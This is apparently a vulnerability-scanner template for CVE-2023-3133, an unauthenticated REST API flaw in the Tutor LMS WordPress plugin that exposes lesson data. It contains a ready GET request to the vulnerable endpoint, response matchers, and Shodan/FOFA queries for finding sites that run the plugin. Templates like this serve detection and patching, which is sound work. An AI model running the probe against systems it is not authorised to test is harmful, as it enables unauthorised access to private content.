id: CVE-2023-3133

info:
  name: Tutor LMS WordPress Plugin Unauthorized Lesson Access
  author: ProjectDiscoveryAI
  severity: high
  description: The Tutor LMS WordPress plugin before 2.2.1 does not implement adequate permission checks for REST API endpoints, allowing unauthenticated attackers to access information from Lessons that should not be publicly available.
  impact: |
    An attacker can access lessons without proper authorization, potentially exposing sensitive information.
  remediation: |
    Update Tutor LMS WordPress Plugin to the latest version to mitigate CVE-2023-3133.
  reference:
    - https://wpscan.com/vulnerability/3b6969a7-5cbc-4e16-8f27-5dde481237f5
    - https://plugins.trac.wordpress.org/browser/tutor/tags/2.2.0/classes/RestAPI.php#L253
    - https://wordpress.org/plugins/tutor/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-3133
    epss-score: 0.00243
    epss-percentile: 0.64704
    cpe: cpe:2.3:a:themeum:tutor_lms:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: themeum
    product: tutor_lms
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/tutor/"
    fofa-query: body=/wp-content/plugins/tutor/
    publicwww-query: /wp-content/plugins/tutor/
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/tutor/v1/lesson/{{topic-id}}"

    matchers:
      - type: word
        words:
          - "lesson data"
          - "attachments"
        part: body
        condition: and
